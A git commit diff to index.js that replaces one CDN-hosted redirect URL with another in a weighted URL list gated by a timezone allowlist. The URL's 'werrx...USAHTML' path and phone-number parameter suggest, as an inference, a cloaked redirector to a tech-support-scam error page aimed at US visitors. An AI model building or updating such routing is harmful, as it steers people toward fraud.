2db388e5de7c023117b107b2a2785a1096702442
paalakash <palaksh452@gmail.com>
2026-07-02 08:17:54 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://trakin.b-cdn.net/werrx01USAHTML/?bcda=1800-403-676", weight: 1.0 }
+    { url: "https://erast.b-cdn.net/werrx01USAHTML/?bcda=1800-403-676", weight: 1.0 }
 
 ];
 
